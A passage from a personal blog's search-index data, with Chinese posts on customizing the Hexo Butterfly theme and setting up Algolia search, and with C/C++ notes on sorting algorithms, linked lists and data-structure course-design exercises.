。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"wordpress","slug":"wordpress","permalink":"http://1905060202.github.io/tags/wordpress/"},{"name":"腾讯云","slug":"腾讯云","permalink":"http://1905060202.github.io/tags/%E8%85%BE%E8%AE%AF%E4%BA%91/"}]},{"title":"配置butterfly时我踩过的坑","date":"2021-08-03T10:18:18.000Z","path":"2021/08/03/配置butterfly时我踩过的坑/","text":"最前面的话因为之前用过很多的主题，并且安装的方式都是从github 上clone 下来。而安装butterfly 的方式是通过npm 下来的。这就导致主题文件并不在theme里。先前的主题文件都是保存在theme里的，并且都会在博客根目录或者主题文件里生成一个_config.xxxx.yml 的.yml文件，所以配置主题就直接修改生成的yml文件就好了。但是捏，我这次npm 挖了很大的一个坑，我找不到生成的_config.butterfly.yml 了！ 在我看小嘉的部落格配置主页文字的时候，有一处需要修改css文件，但我并不知道css文件在哪里。机缘巧合之下，我开始了Google之旅，并发现了先前自己给自己挖的坑。原来npm 下来的主题文件在\\node_modules\\hexo-theme-butterfly，_config.butterfly.yml 也在里面。 我也很佩服自己在没有官方配置文件的前提下，还能装修一阵博客 hhhh。 关于Butterfly的主题配置问题官方文档对于一个主题而言，最权威的莫过于官方文档了。有很多基础的主题配置问题，和其独有的配置问题，官方文档里面都会有介绍。在这里贴上网址：butterfly官方文档 主题文件问题因为我的记性不太好，配置博客主题这件事我又不经常做，所以很容易就会把配置的关键步骤忘记。对于Butterfly而言，我是通过npm下来的，它的配置文件在\\node_modules\\hexo-theme-butterfly，这是最详实的配置文件，如果要对主题进行修改，不要直接修改\\node_modules\\hexo-theme-butterfly里的文件，要把里面的配置复制到blog根目录下的source文件夹里面的_config.butterfly.yml 中。 我已经把\\node_modules\\hexo-theme-butterfly下面的文件中的内容复制到source下的_config.butterfly.yml中去了，所以直接在 _config.butterfly.yml里面改就好。 关于我page的配置cmd中，blog目录下，键入hexo n page ‘about’，就会在source文件夹下生成about文件夹，里面有index.md文件。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"前端","slug":"前端","permalink":"http://1905060202.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"butterfly","slug":"butterfly","permalink":"http://1905060202.github.io/tags/butterfly/"}]},{"title":"Butterfly装修之新手上路","date":"2021-08-02T10:34:41.000Z","path":"2021/08/02/Butterfly装修之新手上路/","text":"最前面的话小站使用的butterfly 版本是v3.8.3 小站是通过npm安装的butterfly 主题，所以主题文件并不在theme里面。而是在\\node_modules\\hexo-theme-butterfly.话说寻找这个主题文件在哪花了我不少功夫 - - 。 文章中的内容参考见： 小嘉的部落格 首页字体、全局背景透明渐变、页脚透明渐变 写在前面装修博客这件事说简单也简单，说繁琐也很繁琐。起初我只是把它当作一个记录学习历程的工具，后来看到许多博主的博客精美巧妙，真的是相形见绌。于是，我也开始了漫长的“打扮”之路。一开始我所用的主题是hexo默认主题，后来改用yilia，next，icarus。直到最近我发现很多朋友都使用butterfly ，一看这主题还不赖，就套用了一下。又因为butterfly的文档是目前我所接触到的写的最详实的，配置主题省了不少事，所以就打算一直用下去了。 给文字加label 3.7.5 及以上版本適用 高亮所需的文字 1&#123;% label text color %&#125; 参数 解释 text 文字 color 【可选】背景颜色，默认为 defaultdefault/blue/pink/red/purple/orange/green 12臣亮言：&#123;% label 先帝 %&#125;創業未半，而&#123;% label 中道崩殂 blue %&#125;。今天下三分，&#123;% label 益州疲敝 pink %&#125;，此誠&#123;% label 危急存亡之秋 red %&#125;也！然侍衞之臣，不懈於內；&#123;% label 忠志之士 purple %&#125;，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。宮中、府中，俱為一體；陟罰臧否，不宜異同。若有&#123;% label 作奸 orange %&#125;、&#123;% label 犯科 green %&#125;，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。 臣亮言：先帝 創業未半，而中道崩殂 。今天下三分，益州疲敝 ，此誠危急存亡之秋 也！然侍衞之臣，不懈於內；忠志之士 ，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。宮中、府中，俱為一體；陟罰臧否，不宜異同。若有作奸 、犯科 ，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。 配置搜索功能注册Algolia账号点我，进入网站使用Google 或者GitHub 注册账号。 创建index 获取信息 npm组件在博客根目录安装 1npm install hexo-algoliasearch --save 在_config.yml 配置 123456789101112131415algolia: appId: &quot;你的appid&quot; apiKey: &quot;你的apikey&quot; adminApiKey: &quot;你的adminapikey&quot; chunkSize: 5000 indexName: &quot;你刚才创建的index名&quot; fields: - content:strip:truncate,0,500 - excerpt:strip - gallery - permalink - photos - slug - tags - title 对照填写刚才框中的东东 在_config.butterfly.yml 配置 1234algolia_search: enable: true hits: per_page: 6 大功告成 hexo clean hexo g hexo algolia 配置首页字体需要你自己新建一个 css 文件，在主题文件里的 source \\ css 文件夹里新建一个 css 文件，命名随意。 往里写几行代码就完事了 1234567891011121314@font-face &#123; font-family:&#x27;arzhu&#x27;; src:url(&#x27;https://cdn.jsdelivr.net/gh/xxx/xxx/font/xxx.ttf&#x27;); /* 修改成你的字体 */ font-display:swap&#125;h1#site-title &#123; font-family:arzhu!important&#125;span#subtitle &#123; font-family:arzhu!important&#125;a#site-name &#123; font-family:arzhu!important&#125; 挑选您心爱的字体，并把它下载下来，可以存在本地，也可以利用 jsdelivr 的方式加速，最后替换 css 文件中的 url 即可，arzhu 只是别名，可以任意修改，不过引用的时候，要确保名字相同 最后在主题的配置文件里找到 inject 配置项，引用刚刚新建的 css 文件即可 1- &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; 配置全局背景透明渐变同理，在刚刚新建的 css 文件里，添加如下代码 1234567891011#recent-posts&gt;.recent-post-item,.layout_page&gt;div:first-child:not(.recent-posts),.layout_post&gt;#page,.layout_post&gt;#post,.read-mode .layout_post&gt;#post &#123; background: var(--light_bg_color)&#125;#aside-content .card-widget &#123; background: var(--light_bg_color)&#125;#web_bg &#123; background: linear-gradient(90deg,rgba(247,149,51,.1),rgba(243,112,85,.1) 15%,rgba(239,78,123,.1) 30%,rgba(161,102,171,.1) 44%,rgba(80,115,184,.1) 58%,rgba(16,152,173,.1) 72%,rgba(7,179,155,.1) 86%,rgba(109,186,130,.1))&#125; 页脚透明渐变完成了如上全局背景透明渐变，那么你的部落格背景就应该会有所变化了，但是发现这个页脚和我们的背景完全不搭 一样在刚刚新建的 css 文件里，添加如下代码 12345678910111213141516171819#footer &#123; background: rgba(255,255,255,.15); color: #000; border-top-right-radius: 20px; border-top-left-radius: 20px; backdrop-filter: saturate(100%) blur(5px)&#125;#footer::before &#123; background: rgba(255,255,255,.15)&#125;#footer #footer-wrap &#123; color: var(--font-color)&#125;#footer #footer-wrap a &#123; color: var(--font-color)&#125; 此时，页脚部分就和我们的背景很般配了","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"前端","slug":"前端","permalink":"http://1905060202.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"butterfly","slug":"butterfly","permalink":"http://1905060202.github.io/tags/butterfly/"}]},{"title":"数据结构之排序算法(一)","date":"2021-08-01T15:22:44.000Z","path":"2021/08/01/数据结构之排序算法-一/","text":"直接插入法是最简单的排序法，其排序思想如下：打牌时，每抓一张牌就将其放到对应的顺序位置。下面是待排记录的类型定义： 12345678910#define MAXSIZE 200typedef int KeyType//关键字类型typedef struct&#123;KeyType key;//关键字InfoType otherinfo;//其他数据项&#125;RedType;//记录类型typededf struct&#123;RedType r[MAXSIZE+1];//r[0]闲置或作为哨兵int length;//顺序表长度&#125;SqList; 上述的RedType结构体类型实际上是没必要定义的，实际做题时可以写成如下代码，更方便一点： 123456#define MAXSIZE 200typedef int KeyType//关键字类型typededf struct&#123;KeyType r[MAXSIZE+1];//r[0]闲置或作为哨兵int length;//顺序表长度&#125;SqList; 直接插入排序算法的描述： 1234567891011121314151617void InsertSort(SqList &amp;L)&#123;//对顺序表L做直接插入排序 for(i=2;i&lt;=L.length;i++) &#123; if(L.r[i]&lt;L.r[i-1]) &#123; L.r[0]=L.r[i];//r[i]暂存到监视哨中 L.r[i]=L.r[i-1];//r[i-1]后移 //记录逐个后移，直到找到插入位置 for(j=i-2;L.r[0]&lt;L.r[j];j--) L.r[j+1]=L.r[j]; L.r[j+1]=L.r[0]; &#125; &#125; &#125; 常见错误^by小胡^：1）低位输出随机数。（记录逐个后移，找到插入位置）三行代码的位置放在了if语句外，导致即便低位符合降序，但仍执行代码，致溢出。 直接插入排序算法分析： 最好的情况是记录序列按关键字有序 比较次数n-1；移动次数0 最坏的情况是记录序列按关键字逆序 比较次数(n+2)(n-1)/2；移动次数(n+4)(n-1)/2 平均情况下比较次数和移动次数约为n^2^/4,时间复杂度为O(N^2^) 直接插入排序容易实现，是稳定排序 直接插入排序也适用于链式结构，不需要移动 适用于初始基本有序的情况 希尔排序法是直接插入法的优化，它的思想是先将整个排序序列分成若干子序列，并分别进行直接插入排序，当整个记录中的序列基本有序时，再对全体记录进行一次直接插入排序。 希尔排序法的描述： 1234567891011121314151617181920void ShellInsert(SqList&amp; L, int dk)&#123;//对顺序表 L 做一趟增量是 dk 的希尔插入排序 int i, j; for (i = dk + 1; i &lt;= L.length; ++i) &#123; if (L.r[i] &lt; L.r[i - dk]) &#123; //需将 L.r[i] 插入有序增量子表 L.r[0] = L.r[i]; //暂存在L.r[0] for (j = i - dk; j &gt; 0 &amp;&amp; L.r[0] &lt; L.r[j]; j -= dk) L.r[j + dk] = L.r[j];//记录后移 L.r[j + dk] = L.r[0];//将 r[0] 插入 &#125;//if &#125;//for&#125;//ShellInsertvoid ShellSort(SqList&amp; L, int dt[], int t)&#123;//按增量序列 dt[0..t-1] 对顺序表 L 作 t 趟希尔排序 int k; for (k = 0; k &lt; t; ++k) ShellInsert(L, dt[k]);&#125; 希尔排序法算法分析： 时间复杂度取决于增量序列，可到 O(N ^4/3^ )，优于直接插入排序 如何选择最佳 d序列，目前尚未解决，但增量系列应该无公因子，最后一个增量值必须为 1 空间复杂度为 O(1) 记录跳跃移动导致排序方法不稳定 只能用于顺序结构，不能用于链式结构 利用希尔排序解决如下问题：输入输入的第一行包含1个正整数n，表示共有n个整数需要参与排序。其中n不超过1000。第二行包含n个用空格隔开的正整数，表示n个需要排序的整数.输出只有1行，包含n个整数，表示从小到大排序完毕的所有整数。请在每个整数后输出一个空格，并请注意行尾输出换行。样例输入102 8 4 6 1 10 7 3 5 9样例输出1 2 3 4 5 6 7 8 9 10 下面是源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;using namespace std;#define KeyType int#define MAXSIZE 1000typedef struct &#123; KeyType r[MAXSIZE+1]; int length;&#125;SqList;void ShellInsert(SqList&amp; L, int dk)&#123;//对顺序表 L 做一趟增量是 dk 的希尔插入排序 int i, j; for (i = dk + 1; i &lt;= L.length; ++i) &#123; if (L.r[i] &lt; L.r[i - dk]) &#123; //需将 L.r[i] 插入有序增量子表 L.r[0] = L.r[i]; //暂存在L.r[0] for (j = i - dk; j &gt; 0 &amp;&amp; L.r[0] &lt; L.r[j]; j -= dk) L.r[j + dk] = L.r[j];//记录后移 L.r[j + dk] = L.r[0];//将 r[0] 插入 &#125;//if &#125;//for&#125;//ShellInsertvoid ShellSort(SqList&amp; L, int dt[], int t)&#123;//按增量序列 dt[0..t-1] 对顺序表 L 作 t 趟希尔排序 int k; for (k = 0; k &lt; t; ++k) ShellInsert(L, dt[k]);&#125;int main()&#123; int n; cin &gt;&gt; n; SqList L; int dlta[1000]; L.length = n; for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; L.r[i]; dlta[i - 1] = n-i; &#125; ShellSort(L,dlta,n); for (int i = 1; i &lt;= n; i++) cout &lt;&lt; L.r[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; return 0;&#125; 冒泡排序排序法，相邻元素之间进行比较，如果逆序则交换位置。 冒泡排序法的描述： 12345678910111213141516 void BubbleSort(SqList &amp;L) &#123;//对顺序表L做冒泡排序 m = L.length − 1; flag = 1;//用来标记某一趟排序是否发生交换 while((m &gt; 0) &amp;&amp; (flag == 1)) &#123; flag = 0; //没有发生交换 for(j = 1; j &lt;= m; j++) if(L.r[j].key &gt; L.r[j + 1].key) &#123; flag = 1;//表示本趟排序发生了交换 t = L.r[j]; L.r[j] = L.r[j + 1]; L.r[j + 1] = t;//交换前后两个记录 &#125;//if −−m; &#125;//while&#125;//BubbleSort 实际上此冒泡排序是对原冒泡排序的一种优化，flag标识符实现了优化。例如：1 2 5 3 7 8 9 10原冒泡排序要比较7趟，而此冒泡排序只需比较3趟。 下面贴上原冒泡排序算法描述： 1234567891011121314void BubbleSort(SqList &amp;L)&#123; int i, j，temp; int m=L.length-1; while(m&gt;0) for (j = 1; j &lt;= m; j++) if (L.r[j] &gt; L.r[j + 1]) &#123; temp = L.r[j]; L.r[j] = L.r[j + 1]; L.r[j + 1] = temp; &#125; --m;&#125; 冒泡排序算法分析: 最好情况下初始有序，只需一趟排序，比较次数为n-1，不需要移动记录 最坏情况是初始逆序，需 n-1 趟排序 比较的次数：n(n-1)/2;移动的次数：3n(n-1)/2 平均时间复杂度为 O(n 2 ) 辅助空间复杂度为 O(1) 是一种稳定的排序方法，可用于链式存储结构 快速排序法是最常用的一种排序方法，同时也是很典型的分治思想，分而治之。它的排序思路如下： 1.任取一个记录作为枢轴2.划分：所有比枢轴小的记录一律前放，比枢轴大的记录一律后放，形成左右两个子表3.对子表重新进行前两步操作，直到每个子表元素只剩一个 快速排序法算法描述： 123456789101112131415161718192021222324252627int Partition(SqList &amp;L,int low,int high)&#123;//对表 r[low..high] 进行一趟排序，返回枢轴位置 L.r[0]=L.r[low]; //子表的第一个记录做枢轴 pivotkey=L.r[low]; while(low&lt;high)&#123;//从表两端交替向中间扫描 while(low&lt;high&amp;&amp;L.r[high]&gt;=pivotkey) −−high; L.r[low]=L.r[high];//比枢轴小的移到低端 while(low&lt;high&amp;&amp;L.r[low]&lt;=pivotkey) ++low; L.r[high]=L.r[low];//比枢轴大的移到高端 &#125;//while L.r[low]=L.r[0]; //枢轴记录到位 return low; //返回枢轴位置&#125;//Partition void QSort(SqList &amp;L, int low, int high) &#123; //对顺序表 L 中的子序列 L.r[low..high] 做快速排序 if(low &lt; high) &#123; //长度大于1 pivotloc = Partition(L, low, high); QSort(L, low, pivotloc − 1);//左子表排序 QSort(L, pivotloc + 1, high);//右子表排序 &#125;//if &#125;//QSort void QuickSort(SqList &amp;L) &#123; //对顺序表L做快速排序 QSort(L, 1, L.length); &#125;//QuickSort 快速排序算法分析： 性能最好情况是均匀划分，时间复杂度是 O(nlog 2 n)。 性能最差情况如初始序列有序，导致最不均匀划分，性能退至O(n ^2^)。 为避免最坏情况发生，可以三者取中，即头、尾和中间记录三者中关键字居中的记录作为枢轴 可以证明，平均计算时间是 O(nlog n)。 实验结果表明：就平均计算时间而言，快速排序是所有内部排序方法中最好的一个。 辅助空间复杂度取决于栈的层次，最坏 O(n), 最好O(log 2 n)。 快速排序不稳定，不适用于链表结构。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"数据结构课程设计之大爱线性表","date":"2021-08-01T15:21:39.000Z","path":"2021/08/01/数据结构课程设计之大爱线性表/","text":"2020数据结构课程设计之大爱线性表 大爱线性表不少参赛同学刚学数据结构，对线性表最是熟悉不过。这里我们给线性表增加两个特殊的操作，第一个是‘R’ 操作，表示逆转整个表，如果表长为L，原来的第i个元素变成第L-i+1个元素。第二个操作是‘D’，表示删除表的第一个元素，如果表为空，则返回一个“error”信息。我们可以给出一系列的‘R’ 和‘D’组合，例如“RDD”表示先逆转表，然后删除最前面的两个元素。 本题的任务是给定表和一个操作串S，求出执行S后的表，如果中途出现‘D’操作于空表，输出“error”。 输入第一行是一个整数，表示有多少组数据。每组测试数据格式如下： (1)第一行是操作串S，有‘R’ 和‘D’组成，S的长度大于0，不超过100 000。(2)第二行是整数n，表示初始时表中的元素个数。n的值不小于0，不超过100 000。(3) 第三行是包含n个元素的表，用‘[’ 和 ‘]’括起来，元素之间用逗号分开。各元素值在[1,100]之间。 解题思路：1）对我而言，本题的难点在于如何正确处理输入与输出操作。所以在输入输出问题上要下功夫。2）如何处理R与D呢？此解法用了两个技巧，头尾指针与计数器。头尾指针k，q分别记录数组元素的位置。计数器记录翻转次数，如果翻转次数模2为0，那么相当于没有翻转。如果R一次，D一次，计数器模2为1，那么q++，模拟元素被移出数组。如果计数器模2为0，那么k++。这样操作！ 下面是源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;#define MAXSIZE 100005//利用数组typedef struct&#123; int array[MAXSIZE];//元素 int length;//数组长度&#125;Arry;Arry L;char option[MAXSIZE];//利用标识符记录翻转次数，如果为偶数，那么相当于没翻转void clean(int len)//清空&#123; for (int i = 0; i &lt; len; i++) option[i] = &#x27;\\0&#x27;;&#125;int main()&#123; int n,m,length_option,p;//n为程序运行次数，m为含有多少个元素，p为输入元素的临时变量,length_option为操作步数 cin &gt;&gt; n; while (n) &#123; char h; int i = 0;//记录元素录入情况 int count = 0;//记录翻转次数 int flag = 0;//记录数是否为空 int k = 0,q=0;//元素指针，记录位置 cin &gt;&gt; option; length_option = strlen(option);//一共有多少个操作步骤 cin &gt;&gt; m; L.length = m; if (m)//输入部分 while (cin &gt;&gt; h) &#123; if (h == &#x27;]&#x27;) break; cin &gt;&gt; p; L.array[i] = p; i++; &#125; else cin &gt;&gt; h &gt;&gt; h; for (i = 0; i &lt; length_option; i++) &#123; if (option[i] == &#x27;R&#x27;) count++; else if (option[i] == &#x27;D&#x27;) &#123; if (!L.length) &#123; flag = 1; break; &#125; L.length--;//数组长度减小 if (count%2==0) k++;//头指针移动位置 else q++;//尾指针移动位置 &#125; &#125; if (flag==1) &#123; cout &lt;&lt; &quot;error&quot; &lt;&lt; endl; n--; continue; &#125; else if(flag==0) &#123; cout &lt;&lt; &quot;[&quot;; if (count % 2==0) &#123; for (i = k; i &lt; m - q; i++) &#123; cout &lt;&lt; L.array[i]; if (i != m - q-1) cout &lt;&lt; &quot;,&quot;; &#125; &#125; else &#123; for (i = m - q - 1; i &gt;= k; i--) &#123; cout &lt;&lt; L.array[i]; if (i != k) cout &lt;&lt; &quot;,&quot;; &#125; &#125; cout &lt;&lt; &quot;]&quot; &lt;&lt; endl; &#125; clean(length_option); n--; &#125; return 0;&#125; 常见错误：1）输出[]为空。元素录入出了问题。2）多余逗号。格式控制出了问题。3）应该正序输出却逆序输出，而且少了数字。大概率!(count%2)写成了!count%2这种形式，疏忽运算符优先级导致的错误。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"数据结构","slug":"数据结构","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"数据结构课程设计之单词检查","date":"2021-08-01T15:20:50.000Z","path":"2021/08/01/数据结构课程设计之单词检查/","text":"2020数据结构课程设计之单词检查： 单词检查(Ⅰ)- 顺序表实现 许多应用程序，如字处理软件，邮件客户端等，都包含了单词检查特性。单词检查是根据字典，找出输入文本中拼错的单词，我们认为凡是不出现在字典中的单词都是错误单词。不仅如此，一些检查程序还能给出类似拼错单词的修改建议单词。 例如字典由下面几个单词组成： bake cake main rain vase 如果输入文件中有词vake ，检查程序就能发现其是一个错误的单词，并且给出 bake, cake或vase做为修改建议单词。 修改建议单词可以采用如下生成技术： (1)在每一个可能位置插入‘a-‘z’中的一者 (2)删除单词中的一个字符 (3)用‘a’-‘z’中的一者取代单词中的任一字符 很明显拼写检查程序的核心操作是在字典中查找某个单词，如果字典很大，性能无疑是非常关键的。 你写的程序要求读入字典文件，然后对一个输入文件的单词进行检查，列出其中的错误单词并给出修改建议。 123456课程设计必须采用如下技术完成并进行复杂度分析及性能比较。(1)朴素的算法,用线性表维护字典(2)使用二叉排序树维护字典(3)采用hash技术维护字典本题要求使用顺序表实现。 基本思路： 1）本题难点以及重点都在字符串的匹配问题上。如果完美匹配或需要替换一个字符，说明字符串长度与字典单词长度一致。又或者，字符串长度与字典单词长度差为±1，少一个或多一个，而且只能有一个字母的差异，其余的字母按顺序都相同，说明需要增或者减字母。 2）有了上述思路，就要想办法用顺序表实现这个功能。从宏观的角度，要开一个大数组（大小&gt;=字典单词），其功能为储存匹配到的单词（建议修改成的）在字典中的序号。 3）在遍历字典中的过程，开始匹配（模糊搜索）。每个字典单词都要与输入的字符串进行匹配（首先判断长度是否相等或差是否为±1）。 4）如果长度相等，那么可能完美匹配，如何判断是否完美匹配呢？可以设置一个变量count，赋初值为0。用它来记录字符的失配次数。如果失配次数等于零，那么便是完美匹配啦！如果失配次数等于1，说明要替换单词。但如果失配次数大于1，便说明字符串无缘修改，直接break跳出单词字符的遍历。 5）如果字符串长度大于字典单词长度，那么可能需要删减一个字符。同4的思路，需要设置一个记录失配次数的count变量，来判断是否真的需要删减一个字符（如果count&gt;1就没必要继续匹配了）。所以，在一开始判断字典单词与字符串长度的时候，我们需要利用if与else if语句分别处理三种长度比较的情况，count变量便可设置在if语句之外。但，如何在长度不相同的情况下来进行匹配字符呢？我们可以利用i，j两个变量，来记录匹配位置。（利用i来记录字符串的位置，利用j来记录字典单词的位置。遍历字符时，截至条件为长度较大的长度。如果两个字符失配，那么j–，这样便可继续按顺序匹配）。 6）如果字符串长度小于字典单词长度，那么可能需要增加一个字符。思路同上，但需要注意的是，在记录匹配位置时有变化。 7）因为自己太菜，输入问题困惑了好久（对我来说也是一个难题嘻嘻），下面贴上输入代码： 1234567891011121314while (cin &gt;&gt; Node[n].character)//输入单词 &#123; if (Node[n].character[0] == &#x27;#&#x27;) break; Node[n].len = strlen(Node[n].character); n++; &#125; while (cin &gt;&gt; search.character)//检查单词 &#123; if (search.character[0] == &#x27;#&#x27;) break; search.len = strlen(search.character); match(search); &#125; 常见错误：1）输出的全部都是correct。判断是否完美匹配的代码放错了位置，因为当长度不满足上述三个情况时（相对于字典单词，字符串长度过大或过小），此时count也为0。所以如果把判断代码放在了末尾，那么势必会出错。 2）答案部分正确。如果思路正确，大概率是格式错误。 解决方案（第一个错误）： 1.将判断语句紧跟在当长度相等if语句后。 2.设置一个flag标识符，在判断是否为完美匹配时，加上flag条件。 下面是源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;iostream&gt;#include&lt;cstring&gt;using namespace std;struct Node &#123; char character[16]; int len;&#125;Node[10001],search;int n = 0;//放在全局变量里，为了记录循环次数//ADTint match_flag[10001];//记录匹配单词在字典中的位置void match(struct Node search)&#123; int i, j; int p=0;//用来记录匹配的单词数目 for (int k = 0; k &lt; n; k++) &#123; int flag = 0;//记录是否不匹配 int count = 0; if (search.len == Node[k].len)//字符串长度等于字典单词长度 &#123; for (i = 0; i &lt; search.len; i++) &#123; if (search.character[i] != Node[k].character[i]) &#123; count++; if (count &gt; 1) break; &#125; &#125; if (!count) flag = 1; &#125; else if (search.len == Node[k].len + 1)//字符串长度大于字典单词长度 &#123; for (i = 0, j = 0; i &lt; search.len; i++, j++) &#123; if (search.character[i] != Node[k].character[j]) &#123; j--; count++; if (count &gt; 1) break; &#125; &#125; &#125; else if (search.len == Node[k].len - 1)//字符串长度小于字典单词长度 &#123; for (i = 0, j = 0; j &lt; Node[k].len; i++, j++) &#123; if (search.character[i] != Node[k].character[j]) &#123; i--; count++; if (count &gt; 1) break; &#125; &#125; &#125; if (count == 0 &amp;&amp; flag == 1)//完美匹配 &#123; cout &lt;&lt; search.character &lt;&lt; &quot; is correct&quot; &lt;&lt; endl; return; &#125; if (count == 1) match_flag[p++] = k; &#125; cout &lt;&lt; search.character &lt;&lt; &quot;: &quot;; for (i = 0; i &lt; p; i++) &#123; cout &lt;&lt; Node[match_flag[i]].character &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl;&#125;int main()&#123; while (cin &gt;&gt; Node[n].character)//输入单词 &#123; if (Node[n].character[0] == &#x27;#&#x27;) break; Node[n].len = strlen(Node[n].character); n++; &#125; while (cin &gt;&gt; search.character)//检查单词 &#123; if (search.character[0] == &#x27;#&#x27;) break; search.len = strlen(search.character); match(search); &#125; return 0;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"数据结构","slug":"数据结构","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"数据结构之单链表的创建和逆转","date":"2021-08-01T15:18:58.000Z","path":"2021/08/01/数据结构之单链表的创建和逆转/","text":"一、单链表的创建 前插法（头插法） 后插法 二、单链表的逆转 一、单链表的创建1.前插法：思路：总将新节点插到链表前端，成为首元节点。 1234567891011121314151617typedef struct LNode &#123; ElemType data; //结点的数据域 struct LNode* next; //结点的指针域&#125; LNode, * LinkList; //LinkList为指向结构体LNode的指针类型void create_list_h(LinkList &amp;L,int n)&#123; L=new LNode; L-&gt;next=NULL;//建立带头结点的单链表 for(int i=n;i&gt;0;i--) &#123; LinkList p=new LNode;//生成新结点 cin&gt;&gt;p-&gt;data;//输入元素值 p-&gt;next=L-&gt;next; L-&gt;next=p;//插入到表头 &#125;&#125; 2.后插法：思路：总将节点插到链表的尾部 12345678910111213141516171819typedef struct LNode &#123; ElemType data; //结点的数据域 struct LNode* next; //结点的指针域&#125; LNode, * LinkList; //LinkList为指向结构体LNode的指针类型void create_list_r(LinkList &amp;L,int n)&#123; L=new LNode; L-&gt;next=NULL; LinkList P=L;//尾指针指向头节点 for(int i=0;i&lt;n;i++) &#123; LinkList q=new LNode; cin&gt;&gt;q-&gt;data; q-&gt;next=NULL; P-&gt;next=q;//插入到表尾 P=q;//q指向新的尾节点 &#125;&#125; 二、单链表的逆转思路：先把链表一分为二，再利用前插法逐一接到头结点处。 12345678910111213141516171819typedef struct LNode &#123; ElemType data; //结点的数据域 struct LNode* next; //结点的指针域&#125; LNode, * LinkList; //LinkList为指向结构体LNode的指针类型void list_inverse(LinkList &amp;L)&#123; LinkList P,q; P=L-&gt;next; L-&gt;next=NULL; //将链表一分为二 while(P) &#123; q=P-&gt;next;//q指向*p的后继节点； P-&gt;next=L-&gt;next; L-&gt;next=P;//*p插在头节点后 P=q; &#125;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"浅谈对结构体的理解","date":"2021-08-01T15:16:10.000Z","path":"2021/08/01/浅谈对结构体的理解/","text":"本文是学习过程中的思考与总结，存在许多不妥之处，若有幸被大牛指点出纰漏，必当及时更正，感激不尽！ 一、什么是结构体？ 二、结构体数组与结构体指针 三、结构体指针作为函数参数 四、typedef的用法 一、什么是结构体？ 可以把结构体当作自定义的数据类型，它相当于一个容器，里面容纳了许多的基本数据类型（int ,float ,char 